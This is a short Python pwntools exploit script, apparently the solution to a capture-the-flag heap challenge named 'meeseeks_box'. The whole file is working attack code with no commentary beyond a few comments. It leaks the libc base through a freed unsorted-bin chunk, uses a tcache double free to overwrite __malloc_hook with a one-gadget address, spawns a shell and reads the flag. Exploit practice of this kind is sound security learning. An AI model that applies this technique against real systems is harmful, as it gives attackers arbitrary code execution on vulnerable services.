from pwn import *
import time

ip = "localhost"
port = 10000

r = remote(ip, port)
# r = process("./meeseeks_box")
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")

context.arch = "amd64"

def Create(sz, data):
    r.sendlineafter(">", "1")
    r.sendlineafter(":", str(sz))
    r.sendlineafter(":", data)

def Show(idx):
    r.sendlineafter(">", "2")
    r.sendlineafter(":", str(idx))

def Delete(idx):
    r.sendlineafter(">", "3")
    r.sendlineafter(":", str(idx))

# unsorted bin
Create(0x900, 'aaaa')
Create(0x20, 'bbbb')
Delete(0)
Show(0)

libc_base = u64(r.recvline()[1:7].ljust(8, '\x00')) - 0x3ebca0
libc.address = libc_base
info("libc base: {}".format(hex(libc_base)))
magic = libc_base + 0x10a38c

# tcache dup
Create(0x20, 'cccc')
Delete(2)
Delete(2)
Create(0x20, p64(libc.sym.__malloc_hook))
Create(0x20, 'dddd')
Create(0x20, p64(magic))

# trigger __malloc_hook and pop the shell
r.sendlineafter(">", "1")
r.sendlineafter(":", "hack")
time.sleep(0.5)
r.sendline("cat /home/`whoami`/flag")

r.interactive()
